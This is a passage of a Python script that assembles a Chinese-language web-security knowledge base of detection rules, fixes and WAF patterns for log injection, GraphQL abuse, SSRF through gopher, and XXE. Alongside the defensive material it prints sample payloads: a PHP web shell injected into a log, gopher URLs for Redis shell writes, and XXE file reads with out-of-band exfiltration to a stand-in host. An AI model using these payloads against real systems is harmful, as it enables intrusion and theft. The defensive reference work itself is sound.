 "日志内容必须转义换行，禁止包含日志文件。",
 "curl -A 'x%0a2026-01-01 admin LOGIN SUCCESS' http://t/\n"
 "curl -A '<?php system($_GET[1]);?>' http://t/ + LFI 包含 access.log",
 "if (input contains '\\r' or '\\n'): sanitize before logging", "", "", "%0a,access.log",
 "结构化日志 + 换行过滤；日志权限收紧；禁止 include 日志。",
 ["%0d%0a 伪造条目", "ANSI 转义污染终端", "超长行截断绕过"],
 "误报：日志框架自动转义时安全。",
 "log-injection,crlf",
 ["https://owasp.org/www-community/attacks/Log_Injection"] ))

D.append(T("GraphQL 内省与批量滥用","graphql","mixed","high",
 "未关闭 introspection 可泄露全部 schema；别名批量查询可绕过限流爆破；"
 "深层嵌套导致 DoS；字段级授权缺失造成越权读。",
 ["graphql","introspection","ApolloServer"],
 ["__schema","introspection","graphql"],
 ["POST /graphql"],
 [R("kbgraphql-1","内省开启","keyword",r"introspection\s*:\s*true|__schema","high",2,"允许内省查询"),
  R("kbgraphql-2","无查询深度限制","keyword",r"(depthLimit|maxDepth|queryComplexity)","medium",3,
    "缺少深度/复杂度限制"),
  R("kbgraphql-3","字段级鉴权缺失","regex",r"(Query|Mutation)\s*:\s*\{[\s\S]{0,400}(password|token|secret)","high",3,
    "schema 暴露敏感字段需确认授权")],
 "生产环境关闭 introspection：ApolloServer({ introspection: false })。",
 "关闭 introspection + 限制查询深度/复杂度 + 别名数量限制；\n"
 "每个 resolver 做字段级授权；对批量查询按实际执行次数计费限流。",
 "const server = new ApolloServer({\n  typeDefs, resolvers,\n  introspection: false,\n"
 "  validationRules: [depthLimit(5)],\n});",
 "javascript",
 "GraphQL 需关内省 + 深度限制 + 字段级授权。",
 "{__schema{types{name fields{name}}}}\n"
 "{a:login(u:\"admin\",p:\"1\"){t} b:login(u:\"admin\",p:\"2\"){t} ...}  # 别名批量爆破",
 "if (body contains '__schema'): block", "", "", "__schema,introspection",
 "关内省；深度/别名限制；字段级授权。",
 ["GET 请求发送 GraphQL", "批量别名绕过限流", "嵌套片段 DoS"],
 "误报：开发环境开放内省属正常。",
 "graphql,api,info-leak",
 ["https://graphql.org/learn/security/"] ))

D.append(T("SSRF → 内网服务利用链（gopher 打 Redis/FPM/MySQL）","ssrf","mixed","critical",
 "SSRF 不止读元数据：gopher:// 可构造任意 TCP 载荷打 Redis 写 shell、打 php-fpm 执行代码、"
 "打 MySQL 未授权、打内网 HTTP 管理面。",
 ["gopher://","dict://","file://"],
 ["gopher://","curl_exec","file_get_contents"],
 ["url","target","host"],
 [R("kbssrf-chain-1","gopher 协议","keyword",r"gopher://","critical",1,"gopher 可构造任意 TCP 流量"),
  R("kbssrf-chain-2","dict 协议","keyword",r"dict://","high",2,"dict 可探测内网端口与服务"),
  R("kbssrf-chain-3","内网地址直连","regex",r"(127\.0\.0\.1|169\.254\.169\.254|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+):\d+","high",2,
    "出现内网地址与端口")],
 "协议白名单 http/https，禁止 gopher/dict/file；出网做目标白名单。",
 "统一出网代理 + 目标域名白名单；禁止跟随重定向；\n"
 "内网服务全部加认证（Redis/FPM/MySQL），纵深防御。",
 "$u = parse_url($url);\nif (!in_array($u['scheme'] ?? '', ['http','https'], true)) { die('bad scheme'); }\n"
 "if (!in_array($u['host'] ?? '', $allowHosts, true)) { die('bad host'); }",
 "php",
 "SSRF 的真正杀伤在 gopher 打内网，必须协议 + 目标双白名单。",
 "# Redis 写 shell\n?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...\n"
 "# FPM 执行\n?url=gopher://127.0.0.1:9000/_%01%01%00%01...",
 "if (param matches '^(gopher|dict|file|ftp)://'): block", "", "", "gopher://,dict://,169.254",
 "协议白名单；内网服务加认证；WAF 拦截 gopher://。",
 ["gopher 大写", "gopher:// 双重编码", "302 跳转到 gopher", "通过 DNS 解析到内网"],
 "误报：URL 为常量或域名白名单内安全。",
 "ssrf,gopher,redis,php-fpm",
 ["https://github.com/tarunkant/Gopherus"] ))

D.append(T("XXE 外部实体注入（含 OOB 外带）","xxe","mixed","high",
 "XML 解析未禁用外部实体时，可用 <!ENTITY xxe SYSTEM \"file:///flag\"> 读文件，"
 "或用参数实体把数据外带到攻击者服务器（盲 XXE）。",
 ["libxml_disable_entity_loader","DocumentBuilder","XMLReader"],
 ["DocumentBuilderFactory","simplexml_load_string","libxml_disable_entity_loader"],
 ["XML body","SOAP","SVG","docx/xlsx"],
 [R("kbxxe-1","XML 解析未禁用实体","regex",
    r"(simplexml_load_string|DOMDocument|xml_parse|DocumentBuilderFactory|XMLReader)[\s\S]{0,120}(load|parse|newInstance)","medium",2,
    "XML 解析需确认已禁用外部实体"),
  R("kbxxe-2","DOCTYPE 出现","keyword",r"<!DOCTYPE[^>]{0,80}(SYSTEM|PUBLIC)","high",1,"XML 含外部 DTD 引用"),
  R("kbxxe-3","参数实体外带","keyword",r"%\s*\w+\s+SYSTEM\s+[\"'](http|ftp)://","critical",1,"参数实体指向外部地址，盲 XXE 外带")],
 "PHP: libxml_disable_entity_loader(true)（PHP<8）；Java: dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)。",
 "解析前禁用 DOCTYPE 与外部实体（Python 用 defusedxml）；\n"
 "如业务需要 DTD，用本地白名单 DTD 并禁用外部协议。",
 "// PHP\nlibxml_use_internal_errors(true);\n$dom = new DOMDocument();\n"
 "$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT ^ LIBXML_NOENT);\n// Java\n"
 "dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);",
 "php",
 "XML 必须禁用 DOCTYPE 与外部实体。",
 "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///flag\">]><r>&x;</r>\n"
 "# 盲 XXE\n<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://me/dtd\">%p;]>",
 "if (body matches '<!DOCTYPE.*(SYSTEM|PUBLIC)'): block", "", "", "DOCTYPE,SYSTEM,ENTITY",
 "禁用 DOCTYPE/外部实体；WAF 拦截 DOCTYPE。",
 ["UTF-16 编码绕过", "参数实体分段拼接", "通过 SVG/DOCX 上传触发"],
 "误报：解析可信本地 XML 时风险低。",
 "xxe,file-read,ssrf",
 ["https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"] ))

p=os.path.join(OUT,"09-knowledge-web.json")
json.dump(D,open(p,"w",encoding="utf-8"),ensure_ascii=False,indent=1)
ids=[r["rule_id"] for t in D for r in t["match_rules"]]
print("templates:",len(D),"rules:",len(ids),"dup:",len(ids)-len(set(ids)),"bytes:",os.path.getsize(p))
print("lookahead:",[r["rule_id"] for t in D for r in t["match_rules"] if any(x in r["pattern"] for x in ("(?!","(?=","(?<"))])
